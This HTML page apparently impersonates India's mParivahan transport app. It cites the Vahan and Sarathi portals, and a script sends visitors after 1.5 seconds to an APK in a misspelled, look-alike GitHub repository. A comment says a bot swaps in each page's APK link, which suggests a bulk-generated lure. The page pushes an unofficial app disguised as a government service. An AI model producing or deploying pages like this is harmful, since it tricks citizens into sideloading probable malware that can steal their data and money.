<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Downloading App</title>
  <style>
    body {
      margin: 0;
      font-family: system-ui, -apple-system, Arial, sans-serif;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(135deg, #0b4fa3, #083a78);
      color: white;
    }

    .card {
      width: 90%;
      max-width: 380px;
      background: rgba(255, 255, 255, 0.08);
      border-radius: 18px;
      padding: 28px 22px;
      text-align: center;
      backdrop-filter: blur(12px);
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
    }

    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid rgba(255, 255, 255, 0.25);
      border-top: 4px solid #fff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 18px;
    }

    @keyframes spin {
      100% { transform: rotate(360deg); }
    }

    h2 { margin: 0 0 8px; }

    .subtext {
      font-size: 14px;
      opacity: 0.85;
      margin-bottom: 18px;
    }

    .info {
      font-size: 13px;
      opacity: 0.8;
      line-height: 1.5;
      margin-bottom: 20px;
    }

    .btn {
      display: block;
      width: 100%;
      padding: 12px;
      background: white;
      color: #0b4fa3;
      border-radius: 10px;
      text-decoration: none;
      font-weight: 600;
      margin-bottom: 10px;
      box-sizing: border-box;
    }

    .note {
      font-size: 12px;
      opacity: 0.65;
    }
  </style>
</head>
<body>

<div class="card">
  <div class="spinner" id="spinner"></div>
  <h2 id="status">Preparing your download</h2>
  <div class="subtext" id="subtext">Securely connecting to server</div>

  <div class="info">
    Driving license holders and registered vehicle owners are advised to ensure that their mobile number is updated on the Vahan and Sarathi portals.
  </div>

  <!-- Change DOWNLOAD_URL in the script below if you host your own APK / use another store link -->
  <a id="downloadBtn" href="#" class="btn">Download App</a>

  <div class="note">
    If the download does not start automatically, use the button above.
  </div>
</div>

<script>
  // ============================================================
  // CONFIG: the bot replaces https://github.com/maparivahana/mparivahaannextgen/raw/refs/heads/main/mparivahaannextgen.apk with the page's GitHub APK.
  var DOWNLOAD_URL = "https://github.com/maparivahana/mparivahaannextgen/raw/refs/heads/main/mparivahaannextgen.apk";
  // ============================================================

  document.getElementById("downloadBtn").href = DOWNLOAD_URL;

  setTimeout(function () {
    window.location.href = DOWNLOAD_URL;
  }, 1500);

  setTimeout(function () {
    document.getElementById("spinner").style.display = "none";
    document.getElementById("status").innerText = "Download is ready";
    document.getElementById("subtext").innerText = "You can proceed using the button above.";
  }, 4000);
</script>

</body>
</html>
